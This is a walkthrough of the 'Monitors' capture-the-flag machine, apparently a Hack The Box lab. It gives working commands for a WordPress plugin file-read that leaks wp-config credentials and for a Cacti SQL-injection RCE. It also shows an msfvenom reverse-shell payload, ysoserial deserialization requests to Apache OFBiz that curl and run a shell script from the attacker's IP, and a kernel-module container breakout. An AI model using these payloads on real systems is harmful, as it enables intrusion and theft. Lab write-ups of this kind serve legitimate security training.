+++
date = '2026-08-20T12:22:37+02:00'
draft = false
title = 'Monitors Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`18/08/2026`**

![pwn.png](/images/imgs_monitors/pwn.png)

---
# Introduction

**_Monitors_** is a challenging **Hard-level Linux** box that demands strong enumeration skills, deep troubleshooting, and a good understanding of **Java** environments and **Docker** capabilities.

The initial foothold requires chaining a **Remote File Inclusion** in a **WordPress** plugin to extract credentials and uncover a hidden **Apache** virtual host running **Cacti**. After exploiting an authenticated **SQL Injection** in **Cacti** to gain code execution, the real internal enumeration begins.

The lateral movement involves dealing with outdated **GLIBC** libraries that break modern tunneling tools, forcing a pivot using **Metasploit**. Once tunneled, we face an **Apache OFBiz** instance vulnerable to **deserialization**, which requires a highly specific **Java** environment to compile the **ysoserial** payloads successfully. Finally, after gaining a shell inside a container, a dangerous **`cap_sys_module` capability** allows us to inject a malicious kernel module and break out to the host system to read both flags.

---
# Techniques Used

- **RFI (Information Disclosure)**

- **Apache Virtual Host Enumeration**

- **Cacti Authenticated SQL Injection (CVE-2020-14295)**

- **Internal Port Forwarding via Metasploit**

- **Apache OFBiz XML-RPC Deserialization (CVE-2020-9496)**

- **Docker Container Breakout via cap_sys_module**

---
# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- monitors
```

```text
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
9773/tcp  filtered unknown
17702/tcp filtered unknown
20061/tcp filtered unknown
45353/tcp filtered unknown
62765/tcp filtered unknown
65265/tcp filtered unknown
```

Targeted scan with scripts and version detection:

```bash
nmap -sC -sV monitors
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open ports**:

- **22**/tcp - SSH

- **80**/tcp - HTTP

## Web Enumeration

Visiting the website on port **80**, I was greeted with a simple message

![web1.png](/images/imgs_monitors/web1.png)

I added **`monitors.htb`** to my **`/etc/hosts`** file and browsed to the domain, revealing a **WordPress** website.

![web2.png](/images/imgs_monitors/web2.png)

I ran **wpscan** to check for immediate vulnerabilities, but it didn't find anything useful.

```bash
wp-scan --url http://monitors.htb
```

In the background, I launched a **Gobuster** directory scan.

![gob1.png](/images/imgs_monitors/gob1.png)

Meanwhile, I manually visited **`/wp-admin`** and found a login form.

![wp-login.png](/images/imgs_monitors/wp-login.png)

I also visited **`/wp-content`**, and since directory indexing wasn't enabled, I ran another **Gobuster** scan specifically against that directory.

```bash
gobuster dir -u http://monitors.htb/wp-content/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

![gob2.png](/images/imgs_monitors/gob2.png)

This second scan found a plugins directory. Browsing to it, I discovered the:
-  **`wp-with-spritz` plugin**.

![plugins.png](/images/imgs_monitors/plugins.png)

---
# Initial Access | RFI to Cacti SQLi

I searched **Google** for any **CVE**s related to this plugin and found an **Exploit-DB** entry (**44544**) detailing an **RFI** vulnerability:

- https://www.exploit-db.com/exploits/44544

![exdb.png](/images/imgs_monitors/exdb.png)

![exdb2.png](/images/imgs_monitors/exdb2.png)

I tested it using the given payload to read **`/etc/passwd`** by manipulating the url parameter:

```text
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
```

![passwd.png](/images/imgs_monitors/passwd.png)

It worked perfectly, and I successfully retrieved the **`/etc/passwd`** file. Grepping for **`/bin/bash`** users, I found the user **marcus**.

Since one of the first things I search for when dealing with a **WordPress** server is the **`wp-config.php`** file, I abused the vulnerability to read it.

![wp-config.png](/images/imgs_monitors/wp-config.png)

I extracted the database password: **`BestAdministrator@2020!`**, which I immediately tried against **SSH** and the **`wp-admin`** login page, but it didn't work.

![ssh_fail.png](/images/imgs_monitors/ssh_fail.png)

![web_fail.png](/images/imgs_monitors/web_fail.png)

I searched for a cheatsheet of interesting **Apache2** files to read.

**Note**: _In **Ubuntu/Debian**-based systems, **Apache** separates virtual host configurations into two directories: **`/etc/apache2/sites-available/`** (where all configs are stored) and **`/etc/apache2/sites-enabled/`** (where symlinks of the currently active sites are placed). When exploiting an RFI, reading files like **`/etc/apache2/sites-enabled/000-default.conf`** is a classic enumeration technique to discover hidden **subdomains** or **internal virtual hosts** that are currently active on the server but not exposed to the public **DNS**._

I retrieved this configuration file using the **RFI**:

```text
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../..///etc/apache2/sites-enabled/000-default.conf
```

![virtual.png](/images/imgs_monitors/virtual.png)

The file referenced two active configuration files:

- **`monitors.htb.conf`**

- **`cacti-admin.monitors.htb.conf`**

I immediately thought about a new **virtual host**: **`cacti-admin.monitors.htb`**. I tried to retrieve the **`.conf`** files themselves but wasn't able to. So, I added the new subdomain to my **`/etc/hosts`** and browsed to it.

A **Cacti** login instance appeared, and the version was exposed at the bottom: **`1.2.12`**.

**Note**: _**Cacti** is a complete open-source network monitoring and graphing solution. It acts as a frontend application for **RRDTool**, allowing administrators to poll network devices at predetermined intervals and graph the resulting data._

![cacti.png](/images/imgs_monitors/cacti.png)

At first, I tried logging in using **`marcus:BestAdministrator@2020!`**, but it failed. Then I tried **`admin:BestAdministrator@2020!`** and successfully logged in.

![cacti_logged.png](/images/imgs_monitors/cacti_logged.png)

I searched for known **CVE**s affecting this specific version:

```bash
searchsploit cacti 1.2.12
```

![scsploit1.png](/images/imgs_monitors/scsploit1.png)

**Searchsploit** returned an exploit: 
- **`Cacti 1.2.12 - 'filter' SQL Injection | php/webapps/49810.py`**.

**Note**: _The **CVE-2020-14295** is an authenticated **SQL injection** vulnerability located in the filter parameter of the **`color.php`** file. Because **Cacti** supports stacked queries, an attacker can manipulate the database to change the **`path_php_binary`** setting to a malicious command. When an update is called, the application executes this payload, escalating the **SQL injection** directly into **Remote Code Execution** (**RCE**)._

I fired up the exploit and gained **Initial Access** as **`www-data`**.

```bash
python3 49810.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.15.152 --lport 22667
```

![initial_access.png](/images/imgs_monitors/initial_access.png)

---
# Lateral Movement | Internal Enum & Tunneling

I immediately targeted the internal databases.

```bash
mysql -u admin -p
```

I retrieved the **WordPress** admin hash:

```SQL
show databases;
use wordpress;
show tables;
select * from wp_users;
```

![db1.png](/images/imgs_monitors/db1.png)

I wasn't able to crack it, so I decided to locally enumerate the **Cacti** instance instead. I searched **Google** to find where **Cacti** stores its **DB** configuration and found it in **`include/config.php`**.

```bash
locate cacti
cd /usr/share/cacti/cacti
cat include/config.php
```

![db2.png](/images/imgs_monitors/db2.png)

I connected to the **DB** as the cacti user and retrieved another admin hash from the **`user_auth`** table, but I wasn't able to crack this one either.

![db3.png](/images/imgs_monitors/db3.png)

Now I was stuck. I tried a fast and generic manual internal enumeration, but eventually preferred to automate the process using **`linpeas.sh`**.
**Linpeas** flagged some interesting potential vectors.

It included the **Copy-Fail** vulnerability, which I completely ignored because I had already tested it on a previous machine and I didn't feel like compromising the system using a **low-hanging fruit** like that.

More importantly, it found a service listening on local port **8443**.

![8443.png](/images/imgs_monitors/8443.png)

I initially tried to transfer **chisel** to create a tunnel. However, since this box is 3-4 years old, it apparently has an outdated version of **`libc6`** 'cause when I tried to run **chisel**, it returned a fatal error caused by **`GLIBC_2.32`** missing.

I was seriously stuck. I read carefully through all the **Linpeas** output again... nothing but that service on port **8443**. The only thing that came to my mind was to create a tunnel using **Metasploit**.

I created a payload for a **meterpreter** session:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f elf > fall.elf
```

I transferred it using **nc**, set up a **meterpreter listener** in **msfconsole**, and ran the script. Once the meterpreter session was obtained, I forwarded the local port:

```bash
portfwd add -L 0.0.0.0 -l 8443 -p 8443 -r 127.0.0.1
```

![msf.png](/images/imgs_monitors/msf.png)

## Exploiting Apache OFBiz (CVE-2020-9496)

Since the webpage on [https://localhost:8443](https://localhost:8443) was showing an **Apache Tomcat 404** error:

![web_8443.png](/images/imgs_monitors/web_8443.png)

I fired up **Gobuster** to enumerate directories.

```bash
gobuster dir -u https://localhost:8843/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -k
```

![gob3.png](/images/imgs_monitors/gob3.png)

It found a lot of results: **`/images`**, **`/content`**, **`/common`**, **`/catalog`**, **`/marketing`**, **`/ecommerce`**, etc.
I analyzed the most interesting ones, and **`/catalog`** redirected me to an **Apache OFBiz** login page. 

![ofbiz_login.png](/images/imgs_monitors/ofbiz_login.png)

The version was clearly exposed: **`Release 17.12.01`**.

I searched for **CVE**s:

```bash
searchsploit Apache OFBiz 17.12.01
```

![scsploit2.png](/images/imgs_monitors/scsploit2.png)

**Note**: _The **CVE-2020-9496** is an unauthenticated **XML-RPC deserialization** vulnerability. The **OFBiz XML-RPC** endpoint (**`/webtools/control/xmlrpc`**) improperly handles incoming **XML** data, specifically allowing the instantiation of arbitrary **Java** objects via the "**serializable**" tag. By crafting a malicious serialized payload (using a tool like **ysoserial**) and embedding it within the **XML** request, an attacker can achieve **Remote Code Execution** (**RCE**) before any authentication checks are even performed._

I downloaded the script and ran it, but from this point on, it became incredibly frustrating to achieve execution.

The original script initially failed because it tried to download a version of **ysoserial** that is no longer available. I searched for another **PoC** ([CVE-2020-9496 on GitHub](https://github.com/ambalabanov/CVE-2020-9496)) but had the same problem.

To resolve this discrepancy, I manually downloaded the latest version of **`ysoserial-all.jar`** from the [official repository](https://github.com/frohoff/ysoserial/releases).

Then, I started receiving fatal errors about my **Java** version:

![script_fail.png](/images/imgs_monitors/script_fail.png)

**Note**: _**Modern Java versions** (**11+**) have stricter module encapsulation, which completely breaks the reflection techniques used by **ysoserial** to generate payloads. I had to explicitly downgrade my environment to **Java 8**.

```bash
sudo apt install temurin-8-jdk
export JAVA8="/usr/lib/jvm/temurin-8-jdk-amd64/bin/java"
```

With the right **Java** environment, I was finally able to use **ysoserial**. Since I wasn't able to get a reverse shell directly via the **deserialization** payload, I created a malicious **`shell.sh`** script on my **Kali** machine:

![shell.png](/images/imgs_monitors/shell.png)

I created the first payload to download my script:

```bash
java -jar ysoserial.jar CommonsBeanutils1 'curl http://10.10.15.152:8000/shell.sh -o /tmp/shell.sh' | base64 | tr -d "\n"
```

![payload1.png](/images/imgs_monitors/payload1.png)

I served the shell on a **Python** server and sent this **POST** request through **Burpsuite** to the **XML-RPC** endpoint:

```XML
POST /webtools/control/xmlrpc HTTP/1.1
Host: localhost:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0)
Connection: close
Content-Type: test/xml
Content-Length: 4137

<?xml version="1.0"?>
<methodCall>
  <methodName>fallingstar</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>fallingstar</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">[payload]</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
```

It successfully downloaded the shell. I then created a second payload to execute it:

```bash
java -jar ysoserial.jar CommonsBeanutils1 'bash /tmp/shell.sh' | base64 | tr -d "\n"
```

![payload2.png](/images/imgs_monitors/payload2.png)

I set up a **netcat** listener, injected the new payload into the exact same **XML** body in **Burp**, sent the request, and finally—after 2 hours of adapting and troubleshooting—I received a shell as **root**.

![container.png](/images/imgs_monitors/container.png)

---
# Privilege Escalation | Container Breakout

I started the enumeration as always by checking **`/dev`** and searching for block devices like **`/sda`**, but there was nothing.
I uploaded **linpeas** again and ran it. Nothing immediately useful at first glance.

I searched **Google** for lists of **container breakout techniques** and read up on **Docker** capabilities:
- https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation. 

Reviewing **Linpeas** output, I noticed it had flagged a lot:

![cap_sys_module.png](/images/imgs_monitors/cap_sys_module.png)

Searching **Google** for "**Container breakout capability name**" one by one, I found a **breakout technique** that involves the **`cap_sys_module`**. It allows a privileged container to load kernel modules directly into the host's kernel.

- [https://greencashew.dev/posts/how-to-add-reverseshell-to-host-from-the-privileged-container/](https://greencashew.dev/posts/how-to-add-reverseshell-to-host-from-the-privileged-container/)

I followed the steps on the container:

```bash
vi rev-shell.c
vi Makefile
make
```

On my attacker machine, I started the final listener:

```bash
nc -lvnp 22667
```

Back on the container, I injected the compiled kernel module into the host:

```bash
insmod rev-shell.ko
```

I successfully escaped the container and retrieved both the **user** and **root flags** directly from the host system.

![flags.png](/images/imgs_monitors/flags.png)

---
# Final Thoughts

I kinda liked this box. Definitely a **Hard** difficulty for the sheer quantity of steps it requires from zero to full system compromise.

However, I think the technical difficulty of the individual steps is more on the **Medium** side. The only exception was the **Java deserialization** part, which was incredibly frustrating because of the newer **Java** and **ysoserial** versions breaking the older **PoC**s (_which is expected, since I've done this machine in 2026_). Dealing with **GLIBC** errors and forcing a **Metasploit** pivot just added to the realism. Overall, a great exercise in persistence and troubleshooting.

**Sources**:

- **WordPress `wp-with-spritz` RFI/LFI | [https://www.exploit-db.com/exploits/44544](https://www.exploit-db.com/exploits/44544)**

- **Apache OFBiz (CVE-2020-9496) PoC | [https://github.com/ambalabanov/CVE-2020-9496](https://github.com/ambalabanov/CVE-2020-9496)**

- **ysoserial Repository | [https://github.com/frohoff/ysoserial/releases](https://github.com/frohoff/ysoserial/releases)**

- **HackTricks - Docker Breakout | [https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation](https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)**

- **Container Breakout via `cap_sys_module` | [https://greencashew.dev/posts/how-to-add-reverseshell-to-host-from-the-privileged-container/](https://greencashew.dev/posts/how-to-add-reverseshell-to-host-from-the-privileged-container/)**